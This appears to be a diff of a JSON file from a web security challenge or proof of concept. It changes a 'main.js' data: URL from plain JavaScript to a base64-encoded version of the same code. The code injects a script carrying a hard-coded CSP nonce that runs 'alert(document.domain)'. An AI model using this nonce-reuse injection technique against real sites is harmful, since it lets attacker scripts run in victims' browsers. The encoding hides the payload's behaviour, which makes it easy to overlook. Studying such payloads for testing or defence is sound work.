@@ -1,5 +1,5 @@
 {
   "files": {
-    "main.js": "data:,window.addEventListener('DOMContentLoaded',()=>{const s=document.createElement('script');s.nonce='3fc3702b61416a8c';s.innerHTML='alert(document.domain)';document.body.appendChild(s)});//"
+    "main.js": "data:application/javascript;base64,Y29uc3QgcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwpzLm5vbmNlID0gJzNmYzM3MDJiNjE0MTZhOGMnOwpzLmlubmVySFRNTCA9ICdhbGVydChkb2N1bWVudC5kb21haW4pJzsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs="
   }
 }
